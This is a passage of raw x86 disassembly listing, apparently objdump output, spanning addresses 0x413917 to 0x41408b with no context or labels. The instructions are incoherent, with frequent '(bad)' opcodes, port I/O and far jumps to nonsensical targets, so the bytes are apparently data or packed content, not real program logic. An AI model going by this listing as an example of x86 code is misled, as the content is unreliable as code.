  413917:	mov    esp,0xc676b663
  41391c:	(bad)  
  41391d:	dec    ebx
  41391e:	retf   0x251
  413921:	gs push ecx
  413923:	lods   eax,DWORD PTR ds:[esi]
  413924:	arpl   si,bp
  413926:	into   
  413927:	pop    ebp
  413928:	add    eax,0xac8e1440
  41392d:	out    0xce,eax
  41392f:	cs jae 0x4139ab
  413932:	pop    ebx
  413933:	hlt    
  413934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413935:	test   eax,0x4199c0d9
  41393a:	cwde   
  41393b:	add    BYTE PTR [esi+0x7dcc961a],dh
  413941:	pop    eax
  413942:	das    
  413943:	pusha  
  413944:	test   DWORD PTR [esi],ecx
  413946:	sbb    ecx,ebx
  413948:	jns    0x413929
  41394a:	adc    ah,BYTE PTR [ebp+0x7a71a356]
  413950:	scas   eax,DWORD PTR es:[edi]
  413951:	xchg   esp,eax
  413952:	clc    
  413953:	push   ebp
  413954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413956:	cmc    
  413957:	cdq    
  413958:	addr16 xor cl,ch
  41395b:	pop    ecx
  41395c:	xchg   esp,eax
  41395d:	test   al,0xa2
  41395f:	add    ch,BYTE PTR gs:[edi+0x4e]
  413963:	popa   
  413964:	cmp    ah,BYTE PTR [ecx]
  413966:	jne    0x413918
  413968:	mov    ch,0xb2
  41396a:	pop    esp
  41396b:	jae    0x413975
  41396d:	mov    ch,0x4
  41396f:	mov    ebx,0xfabd6da1
  413974:	cwde   
  413975:	mov    ecx,eax
  413977:	in     al,dx
  413978:	push   esi
  413979:	xor    al,ch
  41397b:	sbb    eax,0x4034ba95
  413980:	cld    
  413981:	scas   al,BYTE PTR es:[edi]
  413982:	je     0x413987
  413984:	and    eax,0x4b3ef8b4
  413989:	cmc    
  41398a:	push   edi
  41398b:	scas   al,BYTE PTR es:[edi]
  41398c:	add    ebp,DWORD PTR [edx-0x4]
  41398f:	jno    0x413995
  413991:	clc    
  413992:	jle    0x4139fb
  413994:	cmc    
  413995:	add    cl,BYTE PTR [ebx-0x104f30f9]
  41399b:	xchg   esp,eax
  41399c:	das    
  41399d:	jne    0x41397d
  41399f:	aad    0xe4
  4139a1:	jo     0x413950
  4139a3:	fsub   QWORD PTR [ecx+0x6d]
  4139a6:	and    ecx,esp
  4139a8:	mov    ds:0x22ca993f,al
  4139ad:	es mov edx,0xebd7322f
  4139b3:	mov    ebp,DWORD PTR [edx+0x460f56ca]
  4139b9:	test   eax,0x8597608d
  4139be:	push   cs
  4139bf:	lea    ecx,[ecx+0x24]
  4139c2:	fs mov ebx,0x82ed15
  4139c8:	cdq    
  4139c9:	xchg   edx,eax
  4139ca:	shr    DWORD PTR [ecx+edi*1+0x6f1a564b],0x85
  4139d2:	jnp    0x413a42
  4139d4:	add    ah,BYTE PTR [ebp-0x7471e19b]
  4139da:	retf   0x1750
  4139dd:	dec    ecx
  4139de:	cmp    ah,BYTE PTR [ecx+0x38446b77]
  4139e4:	push   ss
  4139e5:	fidivr DWORD PTR [ecx+ecx*4-0x642f1845]
  4139ec:	cmp    al,0x6f
  4139ee:	imul   esp,ebp,0xffffffb3
  4139f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f2:	inc    esi
  4139f3:	or     DWORD PTR ds:0xa405d9b6,0x680b81b5
  4139fd:	sbb    DWORD PTR [ebx+0x209a0a03],edx
  413a03:	sub    ecx,DWORD PTR ds:0x3592add5
  413a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a0a:	aad    0x69
  413a0c:	jmp    0x4139e3
  413a0e:	mov    esp,0x866f8182
  413a13:	or     eax,0xab3005fc
  413a18:	pop    esp
  413a19:	sub    DWORD PTR [edx],ebx
  413a1b:	aaa    
  413a1c:	sbb    ah,ah
  413a1e:	adc    edi,0x43c92924
  413a24:	test   BYTE PTR [eax+0x50],al
  413a27:	xchg   esi,eax
  413a28:	les    eax,FWORD PTR [edi]
  413a2a:	dec    esp
  413a2b:	(bad)  
  413a2c:	cli    
  413a2d:	ins    BYTE PTR es:[edi],dx
  413a2e:	inc    ecx
  413a2f:	mov    dh,BYTE PTR [eax-0x2d0a1ce6]
  413a35:	test   BYTE PTR [esi-0x5d4c2fa3],bl
  413a3b:	test   eax,0xa09bb5df
  413a40:	enter  0x5d55,0xb8
  413a44:	sub    eax,0xd9e57772
  413a49:	cwde   
  413a4a:	and    al,0xfc
  413a4c:	fcomi  st,st(4)
  413a4e:	(bad)  
  413a4f:	dec    eax
  413a50:	or     BYTE PTR [esi-0x6d1850a],bh
  413a56:	adc    al,0xd8
  413a58:	mov    eax,ds:0x8f774f33
  413a5d:	in     eax,dx
  413a5e:	(bad)  
  413a62:	std    
  413a63:	push   0xffffffc4
  413a65:	inc    ecx
  413a66:	xor    eax,0x3250204f
  413a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a6c:	out    0x89,eax
  413a6e:	push   edi
  413a6f:	lahf   
  413a70:	push   esp
  413a71:	xor    al,0x67
  413a73:	mov    ds:0x1936fc40,eax
  413a78:	mov    esp,DWORD PTR [eax-0x70]
  413a7b:	xchg   ebp,eax
  413a7c:	push   cs
  413a7d:	xchg   esp,eax
  413a7e:	cmp    ecx,ebx
  413a80:	jle    0x413aae
  413a82:	ja     0x413a52
  413a84:	repnz and bh,BYTE PTR [esi+0x6e]
  413a88:	aas    
  413a89:	jne    0x413af6
  413a8b:	sbb    bl,BYTE PTR [eax]
  413a8d:	mov    ds:0x72594654,al
  413a92:	out    0xb5,al
  413a94:	rcl    ebx,0x1b
  413a97:	push   ebp
  413a98:	mov    edi,0xe7cb1e2f
  413a9d:	jge    0x413a88
  413a9f:	pushf  
  413aa0:	sub    BYTE PTR [ebx],bl
  413aa2:	inc    ebp
  413aa3:	loope  0x413ab9
  413aa5:	nop
  413aa6:	scas   eax,DWORD PTR es:[edi]
  413aa7:	push   eax
  413aa8:	mov    esp,0x413c57c1
  413aad:	js     0x413a9b
  413aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ab0:	lahf   
  413ab1:	adc    esp,esi
  413ab3:	pop    ebx
  413ab4:	or     BYTE PTR [ebp-0x3dbcdeb9],ah
  413aba:	pop    ebp
  413abb:	in     al,dx
  413abc:	aaa    
  413abd:	stos   BYTE PTR es:[edi],al
  413abe:	cmovb  edx,esi
  413ac1:	inc    ecx
  413ac2:	inc    esi
  413ac3:	(bad)  
  413ac4:	repnz sub eax,0x7ea55366
  413aca:	in     eax,dx
  413acb:	jge    0x413abe
  413acd:	icebp  
  413ace:	ds adc al,ch
  413ad1:	xchg   ebp,eax
  413ad2:	xor    BYTE PTR [edi+0x18],dh
  413ad5:	push   ebp
  413ad6:	rcl    ch,1
  413ad8:	sbb    DWORD PTR [esi],ecx
  413ada:	mov    WORD PTR [ecx],fs
  413adc:	js     0x413aa2
  413ade:	adc    al,0x73
  413ae0:	jecxz  0x413b31
  413ae2:	or     cl,bl
  413ae4:	jl     0x413aa2
  413ae6:	scas   eax,DWORD PTR es:[edi]
  413ae7:	pop    eax
  413ae8:	mov    es,ebp
  413aea:	jmp    0x3efd:0x45e3d333
  413af1:	jno    0x413b49
  413af3:	push   es
  413af4:	call   0x40adf21a
  413af9:	add    ebp,DWORD PTR [edx]
  413afb:	push   edx
  413afc:	xchg   edx,eax
  413afd:	mov    WORD PTR [ebx+0x42],?
  413b00:	push   DWORD PTR ds:0xc6c1ee1e
  413b06:	popa   
  413b07:	jg     0x413b5e
  413b09:	add    al,0x12
  413b0b:	adc    BYTE PTR [ebx+0x33],ch
  413b0e:	pop    edx
  413b0f:	daa    
  413b10:	dec    eax
  413b11:	mov    cl,0x57
  413b13:	lock movs WORD PTR es:[edi],WORD PTR fs:[esi]
  413b17:	cwde   
  413b18:	mov    ah,0x92
  413b1a:	sar    DWORD PTR [ecx+0x58],cl
  413b1d:	push   ds
  413b1e:	test   BYTE PTR [ebp-0x26],bl
  413b21:	iret   
  413b22:	sbb    DWORD PTR ds:0x14b4b09c,edi
  413b28:	imul   ecx,ebx,0xffffffcb
  413b2b:	pop    esp
  413b2c:	retf   
  413b2d:	mov    eax,ds:0x378b4d16
  413b32:	sbb    BYTE PTR [ebx+0x5a604a52],bh
  413b38:	inc    edi
  413b39:	jnp    0x413abc
  413b3b:	repnz dec ebx
  413b3d:	fimul  DWORD PTR [eax]
  413b3f:	ret    0xd96e
  413b42:	mov    eax,ds:0x508e01e0
  413b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b48:	stos   BYTE PTR es:[edi],al
  413b49:	inc    esi
  413b4a:	jae    0x413b32
  413b4c:	cmc    
  413b4d:	sub    ebx,DWORD PTR ds:[ebp-0x36]
  413b51:	jae    0x413b9b
  413b53:	mov    BYTE PTR [ebp-0x167ff609],dl
  413b59:	inc    esi
  413b5a:	mov    ah,0x1d
  413b5c:	lea    edi,[ecx+0x76edc3f0]
  413b62:	xor    al,0x21
  413b64:	sbb    eax,0x2d1f7126
  413b69:	cmp    bh,ch
  413b6b:	add    al,0x39
  413b6d:	pop    ebx
  413b6e:	pop    eax
  413b6f:	jp     0x413b9b
  413b71:	push   0xe6cedfb7
  413b76:	cmp    eax,0xcf015030
  413b7b:	and    eax,0xd3db1d52
  413b80:	mov    bh,0xd0
  413b82:	(bad)  
  413b83:	into   
  413b84:	pop    edi
  413b85:	out    0xa3,al
  413b87:	add    esi,DWORD PTR [ebp+0x5]
  413b8a:	aad    0xfc
  413b8c:	aaa    
  413b8d:	xchg   DWORD PTR [ecx+0x21],esp
  413b90:	faddp  st(1),st
  413b92:	add    edx,esp
  413b94:	cmp    eax,0x5c7dade1
  413b99:	mov    ds:0x3b902e20,al
  413b9e:	call   0xe30a80fc
  413ba3:	mov    dh,0x13
  413ba5:	inc    edi
  413ba6:	or     al,0xcb
  413ba8:	hlt    
  413ba9:	lods   eax,DWORD PTR ds:[esi]
  413baa:	pop    ebp
  413bab:	(bad)  
  413bac:	sbb    edi,DWORD PTR [edi+0x23]
  413baf:	and    bh,BYTE PTR [ebx]
  413bb1:	sbb    eax,0x85f01bb3
  413bb6:	cvtpi2ps xmm0,QWORD PTR [eax+eiz*1-0x40884ab0]
  413bbe:	dec    ecx
  413bbf:	dec    edi
  413bc0:	arpl   WORD PTR [ebp-0x23],bp
  413bc3:	mov    al,0x72
  413bc5:	das    
  413bc6:	sbb    al,BYTE PTR [edx]
  413bc8:	mov    WORD PTR [edx-0x24],es
  413bcb:	adc    BYTE PTR [edi-0x58],0x5d
  413bcf:	lea    ebx,[edx]
  413bd1:	jmp    0xe69:0x68234330
  413bd8:	pop    ss
  413bd9:	sub    eax,0x56f7b66b
  413bde:	jo     0x413bb3
  413be0:	jno    0x413bb3
  413be2:	add    dh,BYTE PTR [eax+0x1282a000]
  413be8:	xor    ch,BYTE PTR [ebx-0xec74777]
  413bee:	push   0xe1869078
  413bf3:	je     0x413c5a
  413bf5:	hlt    
  413bf6:	stos   BYTE PTR es:[edi],al
  413bf7:	(bad)  
  413bf8:	jmp    0x755ba982
  413bfd:	retf   0xa39f
  413c00:	das    
  413c01:	and    edx,DWORD PTR [edx-0x18]
  413c04:	aad    0x68
  413c06:	push   es
  413c07:	pop    ebx
  413c08:	mov    ds:0x7260de3d,eax
  413c0d:	ret    
  413c0e:	sbb    BYTE PTR [ecx],ch
  413c10:	dec    edi
  413c11:	and    al,0xf2
  413c13:	xor    al,0x83
  413c15:	loope  0x413baa
  413c17:	cmp    ebx,ebx
  413c19:	scas   al,BYTE PTR es:[edi]
  413c1a:	scas   al,BYTE PTR es:[edi]
  413c1b:	cmp    eax,0xbcbf97e6
  413c20:	or     edi,DWORD PTR [ebx+0x2c]
  413c23:	xchg   edx,esp
  413c25:	jmp    0x278f:0x6ccd0ada
  413c2c:	push   es
  413c2d:	inc    esi
  413c2e:	ins    DWORD PTR es:[edi],dx
  413c2f:	cmp    BYTE PTR [esi+0x65],0xe2
  413c33:	iret   
  413c34:	repnz inc eax
  413c36:	xlat   BYTE PTR ds:[ebx]
  413c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c38:	push   eax
  413c39:	(bad)  [ebx]
  413c3b:	mov    ds:0xc95ecda1,al
  413c40:	mov    edx,0x54171323
  413c45:	scas   al,BYTE PTR es:[edi]
  413c46:	push   es
  413c47:	dec    edx
  413c48:	pop    ebx
  413c49:	push   edx
  413c4a:	data16 fdivrp st(7),st
  413c4d:	lods   al,BYTE PTR ds:[esi]
  413c4e:	cs loop 0x413ca0
  413c51:	xor    ch,BYTE PTR [eax+ebx*2-0x1bb0b551]
  413c58:	xchg   ebx,eax
  413c59:	cmp    al,0x71
  413c5b:	stos   DWORD PTR es:[edi],eax
  413c5c:	out    dx,al
  413c5d:	mov    ah,0x6f
  413c5f:	or     DWORD PTR [edi+edx*4+0x14],edx
  413c63:	dec    ebp
  413c64:	(bad)  
  413c65:	xor    eax,0xadd2ba8f
  413c6a:	adc    DWORD PTR [eax+0x18d6c35d],ebx
  413c70:	mov    ah,0x12
  413c72:	dec    ecx
  413c73:	jge    0x413c32
  413c75:	xchg   ebp,eax
  413c76:	cmp    ecx,ebp
  413c78:	inc    edx
  413c79:	jecxz  0x413c44
  413c7b:	jmp    0x413cd0
  413c7d:	xor    DWORD PTR [ecx-0x1b],0x2ab3c7b3
  413c84:	inc    esi
  413c85:	(bad)  
  413c86:	ins    BYTE PTR es:[edi],dx
  413c87:	mov    ch,0x2a
  413c89:	push   es
  413c8a:	(bad)  
  413c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c8d:	aam    0x1d
  413c8f:	push   eax
  413c90:	scas   eax,DWORD PTR es:[edi]
  413c91:	push   edx
  413c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c93:	and    ecx,DWORD PTR [ecx+0x16fe085]
  413c99:	dec    edi
  413c9a:	stos   DWORD PTR es:[edi],eax
  413c9b:	cmp    bh,BYTE PTR [esi-0x29]
  413c9e:	adc    esi,edi
  413ca0:	xor    DWORD PTR cs:[edi+0x6f],eax
  413ca4:	sbb    eax,DWORD PTR [ecx+0x6243d62a]
  413caa:	jb     0x413cd1
  413cac:	dec    edx
  413cad:	mov    DWORD PTR [bp+di],edi
  413cb0:	push   edx
  413cb1:	pop    edx
  413cb2:	jmp    0x413c8f
  413cb4:	cmp    DWORD PTR [ebp-0x53],ebx
  413cb7:	iret   
  413cb8:	pop    ss
  413cb9:	mov    al,ds:0x9556daf7
  413cbe:	enter  0x21f0,0x9a
  413cc2:	xor    dh,ch
  413cc4:	inc    ecx
  413cc5:	and    BYTE PTR [edx],bh
  413cc7:	sahf   
  413cc8:	gs call 0x35b56cc0
  413cce:	xchg   esp,eax
  413ccf:	cmp    eax,0xf8f91808
  413cd4:	xchg   edi,eax
  413cd5:	leave  
  413cd6:	mov    DWORD PTR [eax-0x44],ecx
  413cd9:	test   al,0x7
  413cdb:	sbb    al,0x64
  413cdd:	mov    dh,0x92
  413cdf:	cmc    
  413ce0:	pop    esp
  413ce1:	jo     0x413d35
  413ce3:	jmp    DWORD PTR [ecx]
  413ce5:	test   eax,0x2ff66bff
  413cea:	push   0xb8ec1fc6
  413cef:	jmp    0xb68b7ed7
  413cf4:	mov    bh,0x7f
  413cf6:	mov    ds,WORD PTR ds:0xf5eddc7e
  413cfc:	mov    BYTE PTR [ebx+0x3af1e2bc],bh
  413d02:	fiadd  DWORD PTR [edi]
  413d04:	fwait
  413d05:	sbb    ebp,DWORD PTR [edi]
  413d07:	addr16 adc al,0x84
  413d0a:	fstp   QWORD PTR [eax]
  413d0c:	or     eax,0xbce3707c
  413d11:	retf   0x4392
  413d14:	out    dx,eax
  413d15:	scas   al,BYTE PTR es:[edi]
  413d16:	bound  edx,QWORD PTR [ebp+ebp*4+0x5699c4f6]
  413d1d:	jmp    0x3e8b1963
  413d22:	mov    ecx,0x24889f4f
  413d27:	add    ah,BYTE PTR [esi-0x77]
  413d2a:	lods   al,BYTE PTR ds:[esi]
  413d2b:	xchg   ebp,eax
  413d2c:	jo     0x413d77
  413d2e:	aam    0x43
  413d30:	dec    esp
  413d31:	loop   0x413d9b
  413d33:	xor    BYTE PTR [edi+eax*4-0x76],bl
  413d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d38:	rcl    DWORD PTR [esi],0xb
  413d3b:	dec    ebx
  413d3c:	push   ds
  413d3d:	xchg   BYTE PTR [eax-0x50],dh
  413d40:	or     DWORD PTR [ebx],0xb9f83c01
  413d46:	daa    
  413d47:	loope  0x413ccf
  413d49:	loope  0x413d9d
  413d4b:	daa    
  413d4c:	mov    al,0xe9
  413d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d4f:	call   0x5317:0xa947e9a2
  413d56:	sbb    eax,0xc8a4265
  413d5b:	push   cs
  413d5c:	jbe    0x413dc4
  413d5e:	cdq    
  413d5f:	or     eax,0x33bf0315
  413d64:	mov    ch,0xa4
  413d66:	fstp   QWORD PTR [ecx]
  413d68:	push   eax
  413d69:	(bad)  
  413d6a:	ror    DWORD PTR [esi+0x2d],0x7d
  413d6e:	dec    eax
  413d6f:	rcl    eax,0xf2
  413d72:	xchg   esp,eax
  413d73:	sub    al,0x8a
  413d75:	(bad)  
  413d76:	ins    DWORD PTR es:[edi],dx
  413d77:	jb     0x413d32
  413d79:	pusha  
  413d7a:	arpl   bp,bx
  413d7c:	loopne 0x413df7
  413d7e:	xor    edi,DWORD PTR [edx+0x3fc4de9e]
  413d84:	or     al,0x1d
  413d86:	fnstsw WORD PTR [ecx-0x64d68b]
  413d8c:	les    edx,FWORD PTR ds:0x67c222da
  413d92:	(bad)  
  413d93:	jne    0x413d5c
  413d95:	jae    0x413d41
  413d97:	mov    ds:0x4fa24787,eax
  413d9c:	sahf   
  413d9d:	pop    ebp
  413d9e:	cmp    eax,0x151498be
  413da3:	adc    BYTE PTR ds:0x98ecd882,cl
  413da9:	sbb    al,0xb7
  413dab:	rcr    DWORD PTR gs:[edi-0x63363c6d],0xbe
  413db3:	and    ch,bl
  413db5:	and    DWORD PTR [edx-0x71],ebx
  413db8:	dec    ecx
  413db9:	ins    BYTE PTR es:[edi],dx
  413dba:	cmp    eax,0xf700924f
  413dbf:	mov    al,0x4
  413dc1:	push   edx
  413dc2:	sbb    al,0x40
  413dc4:	jmp    0x413e0a
  413dc6:	cld    
  413dc7:	adc    ebx,ebp
  413dc9:	cmp    edx,esi
  413dcb:	inc    eax
  413dcc:	iret   
  413dcd:	jl     0x413e34
  413dcf:	dec    esp
  413dd0:	fwait
  413dd1:	test   DWORD PTR [ecx+0xe02dad8],esi
  413dd7:	mov    ah,0xa1
  413dd9:	adc    BYTE PTR [esi],dh
  413ddb:	pop    eax
  413ddc:	xchg   esi,eax
  413ddd:	jp     0x413ded
  413ddf:	mov    ch,0xb
  413de1:	xor    DWORD PTR cs:[esi+ecx*8],0xff4643d4
  413de9:	pusha  
  413dea:	mov    dl,0x87
  413dec:	xor    eax,0x15e2104
  413df1:	scas   eax,DWORD PTR es:[edi]
  413df2:	add    ebx,DWORD PTR [eax]
  413df4:	in     al,0x44
  413df6:	jne    0x413dab
  413df8:	mov    BYTE PTR [eax-0x7d],dh
  413dfb:	mov    ebx,DWORD PTR [ecx]
  413dfd:	pop    esp
  413dfe:	lods   eax,DWORD PTR ds:[esi]
  413dff:	mul    DWORD PTR [edi+0x5b]
  413e02:	jle    0x413e20
  413e04:	std    
  413e05:	or     DWORD PTR [ebx],0x24f8f30c
  413e0b:	or     DWORD PTR [edx-0x1d],eax
  413e0e:	mov    ebp,0xc87e1e19
  413e13:	mov    ds:0xddd42562,eax
  413e18:	in     eax,dx
  413e19:	push   ds
  413e1a:	jo     0x413db6
  413e1c:	jb     0x413e64
  413e1e:	xchg   esi,eax
  413e1f:	push   ss
  413e20:	fwait
  413e21:	inc    ebp
  413e22:	daa    
  413e23:	push   0xffffffb3
  413e25:	sahf   
  413e26:	xor    edi,DWORD PTR [eax+ebp*1-0x6]
  413e2a:	push   ecx
  413e2b:	std    
  413e2c:	popa   
  413e2d:	int3   
  413e2e:	in     eax,dx
  413e2f:	jp     0x413db8
  413e31:	mov    al,ds:0xe24e8994
  413e36:	ss pop edx
  413e38:	or     DWORD PTR [eax+0x78f257e4],0x39
  413e3f:	add    DWORD PTR [ebp+0x7a],ecx
  413e42:	je     0x413e30
  413e44:	pop    ebp
  413e45:	pop    ds
  413e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e47:	xor    al,0x5b
  413e49:	pop    esi
  413e4a:	addr16 addr16 (bad) 
  413e4d:	jnp    0x413ecc
  413e4f:	std    
  413e50:	jne    0x413e07
  413e52:	mov    edi,0x883ddbba
  413e57:	sub    edx,DWORD PTR [eax+edi*1-0x50]
  413e5b:	jl     0x413ed2
  413e5d:	int    0xd1
  413e5f:	(bad)  
  413e60:	div    BYTE PTR [ebx-0x6d]
  413e63:	mov    dh,0x60
  413e65:	jg     0x413e01
  413e67:	add    bl,BYTE PTR [esi+0x1d89e024]
  413e6d:	sahf   
  413e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e6f:	aam    0x99
  413e71:	add    bl,BYTE PTR [eax]
  413e73:	and    eax,DWORD PTR [edx-0x8020282]
  413e79:	xchg   dl,ah
  413e7b:	pop    esi
  413e7c:	and    BYTE PTR cs:[ebx],ah
  413e7f:	jnp    0x413e67
  413e81:	cmp    al,0xb7
  413e83:	push   edx
  413e84:	stos   BYTE PTR es:[edi],al
  413e85:	aad    0x56
  413e87:	lods   eax,DWORD PTR ds:[esi]
  413e88:	cld    
  413e89:	int3   
  413e8a:	lea    edx,ss:[esi]
  413e8d:	sbb    eax,0x2851a6a0
  413e92:	popa   
  413e93:	test   BYTE PTR [ebx-0x71],dh
  413e96:	lea    esi,[ecx+ebx*2]
  413e99:	sub    DWORD PTR [edi+ebx*8+0x36cd5198],ebp
  413ea0:	ficomp DWORD PTR [ebx]
  413ea2:	jge    0x413ee1
  413ea4:	and    BYTE PTR [eax-0x12a141e4],dl
  413eaa:	inc    esi
  413eab:	pop    esp
  413eac:	rol    DWORD PTR [esi+0x29],cl
  413eaf:	addr16 dec ebx
  413eb1:	leave  
  413eb2:	jg     0x413e95
  413eb4:	inc    esi
  413eb5:	clc    
  413eb6:	jmp    0x57227300
  413ebb:	iret   
  413ebc:	xor    bh,BYTE PTR [ebx+0x31]
  413ebf:	inc    edx
  413ec0:	shl    BYTE PTR [edi+0x4b],0x30
  413ec4:	push   esp
  413ec5:	adc    ecx,ebx
  413ec7:	cmp    esi,ebx
  413ec9:	push   es
  413eca:	cld    
  413ecb:	inc    esp
  413ecc:	xchg   esi,eax
  413ecd:	jno    0x413f05
  413ecf:	int    0x57
  413ed1:	mov    esp,0x125b168e
  413ed6:	lods   eax,DWORD PTR ds:[esi]
  413ed7:	xchg   edi,eax
  413ed8:	fadd   st,st(6)
  413eda:	jecxz  0x413e72
  413edc:	push   es
  413edd:	or     bh,BYTE PTR [eax-0x65ae4e16]
  413ee3:	out    dx,al
  413ee4:	mov    fs,WORD PTR [edi+0x5561aa23]
  413eea:	(bad)  
  413eeb:	leave  
  413eec:	pop    edx
  413eed:	inc    esi
  413eee:	aas    
  413eef:	test   BYTE PTR [ecx+ebp*4],0x46
  413ef3:	rol    DWORD PTR [edx],cl
  413ef5:	test   BYTE PTR [ebp+0x6c],bh
  413ef8:	mov    bh,0x95
  413efa:	test   al,0xd2
  413efc:	sub    edx,DWORD PTR [ebp-0x2e]
  413eff:	mov    esi,0x7fae4219
  413f04:	lods   eax,DWORD PTR ds:[esi]
  413f05:	sub    BYTE PTR [ebx-0x68],0x8d
  413f09:	out    0x76,eax
  413f0b:	add    ah,BYTE PTR [edi-0x63]
  413f0e:	in     al,0xd4
  413f10:	inc    ebx
  413f11:	sahf   
  413f12:	jbe    0x413f2d
  413f14:	push   0x49
  413f16:	daa    
  413f17:	stos   BYTE PTR es:[edi],al
  413f18:	xchg   BYTE PTR [edi+0x69183c30],bh
  413f1e:	jno    0x413f93
  413f20:	addr16 retf 0xd350
  413f24:	shl    ah,cl
  413f26:	and    cl,dl
  413f28:	cmp    ah,BYTE PTR [edi+0x4890a43]
  413f2e:	popf   
  413f2f:	or     eax,0x9f98c03c
  413f34:	lock loope 0x413ec8
  413f37:	mov    dh,BYTE PTR [ecx-0x3]
  413f3a:	out    0xb2,al
  413f3c:	pop    ebx
  413f3d:	jecxz  0x413f37
  413f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f40:	cmp    al,0xf9
  413f42:	into   
  413f43:	inc    ebx
  413f44:	fstp   DWORD PTR [ebp+0x11]
  413f47:	xchg   edi,eax
  413f48:	stos   DWORD PTR es:[di],eax
  413f4a:	inc    ecx
  413f4b:	(bad)  
  413f4c:	sub    ebx,DWORD PTR [ebp+0x29]
  413f4f:	ss jo  0x413f52
  413f52:	inc    ebx
  413f53:	arpl   bp,bx
  413f55:	push   ecx
  413f56:	repnz mov WORD PTR [eax],ss
  413f59:	pop    edi
  413f5a:	hlt    
  413f5b:	bnd jbe 0x413f56
  413f5e:	(bad)  
  413f5f:	int3   
  413f60:	mov    ecx,0x644add87
  413f65:	add    bl,ch
  413f67:	dec    ecx
  413f68:	nop
  413f69:	sbb    esp,DWORD PTR [esi]
  413f6b:	fsincos 
  413f6d:	mov    edx,0x3fd38116
  413f72:	mov    dh,0xfa
  413f74:	shr    BYTE PTR ss:[ebp-0x1a796029],1
  413f7b:	fcmovnu st,st(6)
  413f7d:	and    eax,0xdebf0ed3
  413f82:	cmp    eax,0xb016a615
  413f87:	or     DWORD PTR [edx+0x3a],eax
  413f8a:	or     eax,edi
  413f8c:	mov    dl,0x29
  413f8e:	imul   edx,DWORD PTR [edi+0xaf8f10c],0xffffffa3
  413f95:	sub    ch,dl
  413f97:	fisubr DWORD PTR [edi+0x6c]
  413f9a:	retf   0x80ab
  413f9d:	dec    edi
  413f9e:	pop    ecx
  413f9f:	xchg   edi,eax
  413fa0:	push   0x55c37068
  413fa5:	imul   ecx,DWORD PTR [edx],0xffffffa9
  413fa8:	cld    
  413fa9:	sbb    DWORD PTR [edx+0x5d43044e],esi
  413faf:	mov    DWORD PTR [edi+0x4],edx
  413fb2:	sbb    DWORD PTR [ebp-0x45],eax
  413fb5:	inc    ecx
  413fb6:	xchg   ecx,eax
  413fb7:	adc    DWORD PTR [edi],edx
  413fb9:	sbb    bh,dh
  413fbb:	test   DWORD PTR [ebx-0x2ad6bb2b],ebp
  413fc1:	leave  
  413fc2:	ss in  eax,dx
  413fc4:	add    dl,cl
  413fc6:	xchg   ecx,eax
  413fc7:	stos   BYTE PTR es:[edi],al
  413fc8:	ret    
  413fc9:	add    dl,bh
  413fcb:	adc    bh,BYTE PTR [ebp-0x6ae3aa5c]
  413fd1:	pop    es
  413fd2:	xchg   esp,eax
  413fd3:	test   al,0x7e
  413fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fd6:	mov    edi,0xd5fed8f9
  413fdb:	mov    edi,0xf7747e1d
  413fe0:	in     al,0xa1
  413fe2:	mov    edi,es
  413fe4:	aaa    
  413fe5:	popf   
  413fe6:	scas   eax,DWORD PTR es:[edi]
  413fe7:	cmp    al,0xab
  413fe9:	les    eax,FWORD PTR [ecx-0x64bbf88b]
  413fef:	and    dh,dh
  413ff1:	push   cs
  413ff2:	cld    
  413ff3:	cmc    
  413ff4:	jecxz  0x413ff9
  413ff6:	mov    edx,0xe8539872
  413ffb:	mov    BYTE PTR ss:[eax-0x21],al
  413fff:	test   al,0xe4
  414001:	mov    dl,ah
  414003:	cmp    edx,DWORD PTR [edi]
  414005:	add    al,al
  414007:	adc    ebp,0x3075681f
  41400d:	pushf  
  41400e:	shr    DWORD PTR [ebp-0x4e],0x9f
  414012:	xor    eax,0xcfef4cbe
  414017:	inc    edx
  414018:	test   DWORD PTR [edx-0x3b95a5e3],eax
  41401e:	sahf   
  41401f:	mov    dl,0xb2
  414021:	pusha  
  414022:	rol    DWORD PTR [ebx+0x64d66a97],cl
  414028:	test   bh,ah
  41402a:	inc    eax
  41402b:	push   ss
  41402c:	cmp    DWORD PTR [esi+0x47],esp
  41402f:	xor    al,BYTE PTR [esi]
  414031:	dec    esp
  414032:	retf   
  414033:	inc    esi
  414034:	iret   
  414035:	fs cli 
  414037:	sub    al,0x1e
  414039:	add    esi,DWORD PTR [esi-0xc161b9f]
  41403f:	(bad)  [edx]
  414041:	ret    
  414042:	jp     0x413fdf
  414044:	xor    al,0x60
  414046:	popa   
  414047:	lods   eax,DWORD PTR ds:[esi]
  414048:	arpl   WORD PTR [ebx+0x631c8d85],ax
  41404e:	mov    ds:0x8c6bec73,al
  414053:	mov    al,BYTE PTR [eax+ebp*2]
  414056:	dec    ebx
  414057:	push   eax
  414058:	das    
  414059:	js     0x414083
  41405b:	jns    0x414076
  41405d:	stos   BYTE PTR es:[edi],al
  41405e:	jne    0x41409a
  414060:	jp     0x413fe2
  414062:	xchg   edi,eax
  414063:	mov    eax,ds
  414065:	add    al,0xce
  414067:	add    al,0x49
  414069:	mov    edx,0x4cb7c3aa
  41406e:	std    
  41406f:	pop    esp
  414070:	jne    0x414061
  414072:	pop    ds
  414073:	out    0x4b,eax
  414075:	arpl   WORD PTR [ebp+0x1f],bx
  414078:	fst    DWORD PTR [ebx+0x358b1d26]
  41407e:	add    BYTE PTR [edi+0x60436d73],bl
  414084:	ja     0x41409e
  414086:	mov    ecx,0xfdb07c9c
  41408b:	fs mov di,0x2eb3
